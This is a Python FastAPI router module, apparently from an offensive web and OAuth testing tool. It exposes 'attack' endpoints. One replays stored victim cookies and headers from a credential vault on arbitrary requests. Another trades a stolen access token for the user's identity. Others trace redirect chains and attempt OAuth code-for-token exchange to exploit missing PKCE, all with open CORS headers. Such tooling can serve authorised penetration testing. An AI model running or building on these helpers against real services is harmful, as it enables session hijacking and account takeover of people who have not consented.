"""Server-side attack helpers — fetch, validate-token, test-redirect, exchange-code."""

from urllib.parse import urlparse

from fastapi import APIRouter, Depends, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel

from core.auth import verify_api_key
from core.config import OPEN_CORS_HEADERS
from core.replay import get_http_client
from core.sse import broadcast
from core.vault import CredentialVault

router = APIRouter(prefix="/r3d/attack", tags=["attacks"])

# ─── Request Models ──────────────────────────────────────────────────


class ServerFetchRequest(BaseModel):
    url: str
    method: str = "GET"
    headers: dict = {}
    body: str | None = None
    follow_redirects: bool = True
    useAuthContext: bool = True


class ValidateTokenRequest(BaseModel):
    accessToken: str
    userinfoUrl: str
    headers: dict = {}


class TestRedirectRequest(BaseModel):
    url: str
    headers: dict = {}


class ExchangeCodeRequest(BaseModel):
    tokenEndpoint: str
    code: str
    clientId: str
    redirectUri: str
    headers: dict = {}


# ─── Endpoints ───────────────────────────────────────────────────────


@router.post("/fetch", dependencies=[Depends(verify_api_key)])
async def attack_fetch(body: ServerFetchRequest, request: Request):
    """Server-side fetch — bypasses all browser restrictions.

    Auto-merges stored auth context (cookies, headers) from the extension
    for the target origin unless useAuthContext is False. Credentials are
    decrypted on-demand from QE-encrypted storage.
    """
    try:
        origin = ""
        try:
            p = urlparse(body.url)
            origin = f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        vault: CredentialVault = request.app.state.credential_vault
        merged = await vault.get_replay_headers(origin, body.headers) if body.useAuthContext else (body.headers or {})
        async with get_http_client(follow_redirects=body.follow_redirects, timeout=15) as client:
            resp = await client.request(
                method=body.method,
                url=body.url,
                headers=merged,
                content=body.body.encode() if body.body else None,
            )
            resp_headers = dict(resp.headers)
            resp_body = resp.text[:5000]

            broadcast("attack_fetch", {
                "url": body.url,
                "status": resp.status_code,
                "headers": {k: v for k, v in resp_headers.items() if k.lower() in (
                    "content-security-policy", "strict-transport-security",
                    "x-frame-options", "x-content-type-options",
                    "access-control-allow-origin", "access-control-allow-credentials",
                    "location", "set-cookie", "www-authenticate",
                )},
                "bodyPreview": resp_body[:200],
            })

            return JSONResponse(
                content={
                    "ok": True,
                    "status": resp.status_code,
                    "headers": resp_headers,
                    "body": resp_body,
                    "redirectHistory": [str(r.url) for r in resp.history] if resp.history else [],
                },
                headers=OPEN_CORS_HEADERS,
            )
    except Exception as exc:
        return JSONResponse(
            status_code=502,
            content={"ok": False, "error": str(exc)},
            headers=OPEN_CORS_HEADERS,
        )


@router.post("/validate-token", dependencies=[Depends(verify_api_key)])
async def attack_validate_token(body: ValidateTokenRequest, request: Request):
    """Trade a stolen access_token for user identity via /userinfo.

    Auto-merges stored auth context for the IdP origin. Credentials are
    decrypted on-demand from QE-encrypted storage.
    """
    try:
        origin = ""
        try:
            p = urlparse(body.userinfoUrl)
            origin = f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        vault: CredentialVault = request.app.state.credential_vault
        async with get_http_client(timeout=10) as client:
            headers = await vault.get_replay_headers(origin, body.headers)
            headers.update({"Authorization": f"Bearer {body.accessToken}", "Accept": "application/json"})
            resp = await client.get(
                body.userinfoUrl,
                headers=headers,
            )
            if resp.status_code == 200:
                user_data = resp.json()
                broadcast("token_validated", {
                    "valid": True,
                    "status": resp.status_code,
                    "sub": user_data.get("sub", ""),
                    "email": user_data.get("email", ""),
                    "name": user_data.get("name", ""),
                    "groups": user_data.get("groups", []),
                })
                return JSONResponse(
                    content={"ok": True, "valid": True, "user": user_data},
                    headers=OPEN_CORS_HEADERS,
                )
            else:
                return JSONResponse(
                    content={"ok": True, "valid": False, "status": resp.status_code, "body": resp.text[:500]},
                    headers=OPEN_CORS_HEADERS,
                )
    except Exception as exc:
        return JSONResponse(
            status_code=502,
            content={"ok": False, "error": str(exc)},
            headers=OPEN_CORS_HEADERS,
        )


@router.post("/test-redirect", dependencies=[Depends(verify_api_key)])
async def attack_test_redirect(body: TestRedirectRequest, request: Request):
    """Follow a redirect chain server-side and report every hop.

    Auto-merges stored auth context for the target origin. Credentials are
    decrypted on-demand from QE-encrypted storage.
    """
    try:
        origin = ""
        try:
            p = urlparse(body.url)
            origin = f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        vault: CredentialVault = request.app.state.credential_vault
        merged = await vault.get_replay_headers(origin, body.headers)
        hops = []
        async with get_http_client(follow_redirects=True, timeout=15, max_redirects=10) as client:
            resp = await client.get(body.url, headers=merged)
            for r in resp.history:
                hops.append({
                    "url": str(r.url),
                    "status": r.status_code,
                    "location": r.headers.get("location", ""),
                })
            hops.append({"url": str(resp.url), "status": resp.status_code, "location": "(final)"})

        broadcast("redirect_tested", {
            "startUrl": body.url,
            "finalUrl": str(resp.url),
            "hops": len(hops),
            "redirected": len(resp.history) > 0,
        })

        return JSONResponse(
            content={"ok": True, "hops": hops, "finalUrl": str(resp.url), "finalStatus": resp.status_code},
            headers=OPEN_CORS_HEADERS,
        )
    except Exception as exc:
        return JSONResponse(
            status_code=502,
            content={"ok": False, "error": str(exc)},
            headers=OPEN_CORS_HEADERS,
        )


@router.post("/exchange-code", dependencies=[Depends(verify_api_key)])
async def attack_exchange_code(body: ExchangeCodeRequest, request: Request):
    """Attempt OAuth code->token exchange server-side (proves missing PKCE).

    Auto-merges stored auth context for the token endpoint origin. Credentials
    are decrypted on-demand from QE-encrypted storage.
    """
    try:
        origin = ""
        try:
            p = urlparse(body.tokenEndpoint)
            origin = f"{p.scheme}://{p.netloc}"
        except Exception:
            pass
        vault: CredentialVault = request.app.state.credential_vault
        async with get_http_client(timeout=10) as client:
            headers = await vault.get_replay_headers(origin, body.headers)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            resp = await client.post(
                body.tokenEndpoint,
                data={
                    "grant_type": "authorization_code",
                    "code": body.code,
                    "client_id": body.clientId,
                    "redirect_uri": body.redirectUri,
                },
                headers=headers,
            )
            resp_data = resp.json() if "json" in (resp.headers.get("content-type", "")) else {"raw": resp.text[:1000]}
            success = resp.status_code == 200 and "access_token" in resp_data

            event_type = "code_exchanged" if success else "code_rejected"
            broadcast(event_type, {
                "tokenEndpoint": body.tokenEndpoint,
                "status": resp.status_code,
                "success": success,
                "hasAccessToken": "access_token" in resp_data,
                "hasPKCEError": "code_verifier" in resp.text.lower() or "pkce" in resp.text.lower(),
            })

            return JSONResponse(
                content={"ok": True, "status": resp.status_code, "success": success, "response": resp_data},
                headers=OPEN_CORS_HEADERS,
            )
    except Exception as exc:
        return JSONResponse(
            status_code=502,
            content={"ok": False, "error": str(exc)},
            headers=OPEN_CORS_HEADERS,
        )
